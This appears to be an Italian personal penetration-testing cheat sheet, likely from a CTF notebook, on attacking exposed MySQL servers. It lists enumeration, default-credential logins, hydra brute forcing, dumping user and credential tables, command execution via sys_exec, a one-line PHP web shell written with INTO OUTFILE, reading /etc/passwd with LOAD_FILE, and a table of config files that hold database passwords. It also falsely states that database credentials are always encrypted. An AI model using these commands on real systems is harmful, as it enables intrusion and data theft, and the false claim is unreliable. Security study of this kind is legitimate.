#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Accesso Anonimo o Default]]
- [[#Bruteforce]]
- [[#Dump di Tabelle e Credenziali]]
- [[#Esecuzione Comandi via SQL]]
- [[#File Read/Write da MySQL]]
- [[#File Configurazione]]
	1. [[#Credenziali]]
	2. [[#Database]]

---
---
---
### Introduzione

_MySQL_ Ã¨ un popolare RDBMS (Relational Database Management System) open source, utilizzato da moltissime applicazioni web.  
Opera sulla porta TCP/3306 e viene spesso lasciato esposto in maniera insicura.  
Durante un penetration test, un server MySQL accessibile puÃ² offrire:
- Accesso a dati sensibili
- Credential harvesting
- Code execution

---
### Enumerazione
Per identificare MySQL e la versione:

```
nmap -p 3306 --script=mysql-info target.com`
```

---
### Accesso Anonimo o Default
Alcune istanze MySQL permettono login senza password o con credenziali deboli/predefinite:

```
mysql -h target.com -u root mysql -h target.com -u root -p
```

> [!WARNING]
> Credenziali comuni:
> - `root:root`
> - `admin:admin`
> - `root:`
> - `mysql:mysql`

---
### Bruteforce

```
hydra -L users.txt -P passwords.txt mysql://target.com
```

---
### Dump di Tabelle e Credenziali
Una volta autenticati:

```
SHOW DATABASES; 
USE dbname; 
SHOW TABLES; 
SELECT * FROM users;
```

Se vuoi fare dump massivo:

```
mysqldump -h target.com -u user -p --all-databases > backup.sql`
```

> [!ATTENTION]
> Cerca tabelle come:
> - `users`
> - `admin`
> - `credentials`
> - `logins`

---

### Esecuzione Comandi via SQL
In versioni vecchie o con configurazioni deboli:

```
SELECT sys_exec('id');
```

Oppure scrittura di file[[ðŸ”¡ Glossario#Web Shell| web shellÂ°]]:

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Richiede privilegio `FILE` e spesso il percorso deve essere scrivibile.

ðŸ“š Writeups:
- *Linux:*[[Linux#Stapler| Stapler]],

---
### File Read/Write da MySQL
Leggere file locali:

```
SELECT LOAD_FILE('/etc/passwd');
```

Scrivere file (con `FILE` e `INTO OUTFILE`):

```
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
```

Puoi scrivere chiavi SSH, reverse shell PHP o persino `cronjob`.

---
### File Configurazione
##### Credenziali
Molto spesso tra nella webroot si trovano le credenziali del database:

| **Tecnologia / CMS / Stack** | **File**                                  | **Percorso comune**                 | **Formato / Indicazioni**                   |
| ---------------------------- | ----------------------------------------- | ----------------------------------- | ------------------------------------------- |
| PHP + MySQL                  | `config.php`, `db.php`, `settings.php`    | `/var/www/html/`, `/site/`, `/app/` | Contiene `$db_user`, `$db_pass`, `$db_name` |
| [[Wordpress]]                | `wp-config.php`                           | `/var/www/html/`, `/wordpress/`     | `define('DB_USER', '...')`                  |
| [[Drupal]]                   | `settings.php`                            | `sites/default/`                    | `$databases['default']['default']`          |
| [[Joomla!]]                  | `configuration.php`                       | root del sito                       | `public $user`, `public $password`          |
| [[Laravel]]                  | `.env`                                    | root progetto Laravel               | `DB_USERNAME=root`                          |
| [[Symfony]]                  | `.env`, `parameters.yml`, `services.yaml` | `config/`, root                     | `DATABASE_URL=...`                          |
| [[Django]]                   | `settings.py`                             | `project/settings.py`               | `DATABASES = { ... }`                       |
| [[Node.js]]                  | `.env`, `config.js`                       | root progetto                       | `DB_USER=`, `DB_PASS=`                      |
| [[Magento]]                  | `env.php`                                 | `app/etc/`                          | array con user/pass DB                      |
| [[Mantis]]                   | `config_inc.php`                          | `/var/www/bugtracker/config`        |                                             |

ðŸ“š Writeups:
- *Linux:*[[Linux#Delivery| Delivery]],[[Linux#Blogger| Blogger]],[[Linux#Friendzone| Friendzone]],[[Linux#Zeno| Zeno]],[[Linux#Zab| Zab]],[[Linux#Mantis| Mantis]],
- *WIndows:*[[Windows#Previse| Previse]],

> [!ATTENTION]
> Le credenziali del database sono sempre cifrate, utilizza `john` o `hashcat` per il craccarle.

##### Database
Alcune volte Ã¨ possibile trovare file contenenti tutti i record del database con estensione `.zip`, `.sql`, `.db`, `.sqlite3`, `.json`, `.csv`, `.bak`, `.old` e `.xml`.

ðŸ“š Writeups:
- *Linux:*[[Linux#Magic| Magic]],
